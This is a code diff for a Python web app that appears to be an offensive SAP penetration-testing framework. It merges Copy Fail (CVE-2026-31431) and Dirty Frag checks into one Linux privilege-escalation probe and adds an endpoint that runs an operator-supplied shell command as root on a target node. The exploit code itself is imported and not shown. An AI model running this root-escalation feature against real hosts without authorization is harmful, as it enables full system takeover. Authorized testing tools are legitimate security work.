@@ -3656,39 +3656,61 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:check_cve_31324", "Check CVE-2025-31324", _run)
         return json.dumps({"status": "started"})
 
-    @app.route("/api/node/<sid>/check_copyfail", method="POST")
-    def node_check_copyfail(sid):
-        """Check if this node's Linux host is vulnerable to CVE-2026-31431."""
+    @app.route("/api/node/<sid>/check_linux_lpe", method="POST")
+    @app.route("/api/node/<sid>/check_copyfail",  method="POST")  # legacy alias
+    def node_check_linux_lpe(sid):
+        """Probe both Copy Fail (CVE-2026-31431) and Dirty Frag.  The
+        auto-picker reports which technique is viable + which it would
+        select.  Legacy ``/check_copyfail`` path still works."""
         response.content_type = "application/json"
         node = api.state.get_node(sid)
         if not node:
             return json.dumps({"error": f"Node {sid} not found"})
 
         def _run():
-            _task_start(f"{sid}:check_copyfail", f"{sid}: checking CVE-2026-31431")
+            _task_start(f"{sid}:check_linux_lpe",
+                        f"{sid}: checking Linux root LPE")
             try:
-                from sapmap_copyfail import check_copyfail
-                res = check_copyfail(node)
-                node.copyfail_vulnerable = res.get("vulnerable", False)
-                node.copyfail_kernel = res.get("kernel", "")
-                sev = "HIGH" if res["vulnerable"] else "INFO"
+                from sapmap_lpe_auto import check_linux_lpe
+                res = check_linux_lpe(node)
+                method = res.get("method") or ""
+                cf = res.get("copyfail") or {}
+                df = res.get("dirtyfrag") or {}
+                # One headline finding per method, tagged with severity
+                # by viability so the operator sees both lines clearly.
                 sapmap_findings.emit_finding(
-                    sev, sid,
-                    f"CVE-2026-31431 (Copy Fail): "
-                    f"{'VULNERABLE' if res['vulnerable'] else 'not vulnerable'} "
-                    f"— kernel {res.get('kernel', '?')}. {res.get('reason', '')}",
-                    ref="lpe.copyfail.check",
-                    meta=res)
+                    "HIGH" if cf.get("vulnerable") else "INFO", sid,
+                    f"Copy Fail (CVE-2026-31431): "
+                    f"{'VULNERABLE' if cf.get('vulnerable') else 'not vulnerable'}"
+                    f" — kernel {cf.get('kernel', '?')}. "
+                    f"{cf.get('reason', '')}",
+                    ref="lpe.copyfail.check", meta=cf)
+                sapmap_findings.emit_finding(
+                    "HIGH" if df.get("vulnerable") else "INFO", sid,
+                    f"Dirty Frag: "
+                    f"{'VULNERABLE' if df.get('vulnerable') else 'not vulnerable'}"
+                    f" — kernel {df.get('kernel', '?')} arch "
+                    f"{df.get('arch', '?')}. {df.get('reason', '')}",
+                    ref="lpe.dirtyfrag.check", meta=df)
+                if method:
+                    sapmap_findings.emit_finding(
+                        "INFO", sid,
+                        f"Auto-picker selected: {method}.  {res.get('summary','')}",
+                        ref="lpe.linux.method")
             except Exception as e:
-                print(f"[-] {sid}: check_copyfail error: {e}")
+                print(f"[-] {sid}: check_linux_lpe error: {e}")
             finally:
-                _task_end(f"{sid}:check_copyfail")
+                _task_end(f"{sid}:check_linux_lpe")
         threading.Thread(target=_run, daemon=True).start()
         return json.dumps({"status": "started"})
 
-    @app.route("/api/node/<sid>/exploit_copyfail", method="POST")
-    def node_exploit_copyfail(sid):
-        """Run a shell command as root via CVE-2026-31431 Copy Fail LPE."""
+    @app.route("/api/node/<sid>/exploit_linux_lpe", method="POST")
+    @app.route("/api/node/<sid>/exploit_copyfail",  method="POST")  # legacy alias
+    def node_exploit_linux_lpe(sid):
+        """Run a shell command as root using the best available Linux
+        LPE technique.  Auto-picker prefers Copy Fail when both viable;
+        falls back to Dirty Frag.  Legacy ``/exploit_copyfail`` path
+        still works."""
         response.content_type = "application/json"
         node = api.state.get_node(sid)
         if not node:
@@ -3697,29 +3719,30 @@ def create_app(api: SAPMAPApi) -> Bottle:
         command = data.get("command", "id")
 
         def _run():
-            _task_start(f"{sid}:exploit_copyfail",
-                        f"{sid}: Copy Fail LPE — running: {command}")
+            _task_start(f"{sid}:exploit_linux_lpe",
+                        f"{sid}: Linux LPE — running: {command}")
             try:
-                from sapmap_copyfail import run_as_root
-                res = run_as_root(node, command)
+                from sapmap_lpe_auto import run_linux_lpe
+                res = run_linux_lpe(node, command)
+                method = res.get("method") or "?"
                 if res.get("ok"):
-                    node.copyfail_root_obtained = True
                     sapmap_findings.emit_finding(
                         "CRITICAL", sid,
-                        f"Root obtained via CVE-2026-31431 on {sid}. "
-                        f"Command: {command!r}. "
+                        f"Root obtained via {method} on {sid}.  "
+                        f"Command: {command!r}.  "
                         f"Output: {res.get('stdout', '')[:200]}",
-                        ref="lpe.copyfail.root_obtained",
+                        ref=f"lpe.{method}.root_obtained",
                         meta={"command": command,
+                              "method": method,
                               "stdout": res.get("stdout", "")[:500]})
-                    print(f"[+] {sid}: Copy Fail root — output: "
+                    print(f"[+] {sid}: {method} root — output: "
                           f"{res.get('stdout', '')[:300]!r}")
                 else:
-                    print(f"[-] {sid}: Copy Fail failed: {res.get('error')}")
+                    print(f"[-] {sid}: Linux LPE failed: {res.get('error')}")
             except Exception as e:
-                print(f"[-] {sid}: exploit_copyfail error: {e}")
+                print(f"[-] {sid}: exploit_linux_lpe error: {e}")
             finally:
-                _task_end(f"{sid}:exploit_copyfail")
+                _task_end(f"{sid}:exploit_linux_lpe")
         threading.Thread(target=_run, daemon=True).start()
         return json.dumps({"status": "started"})
 
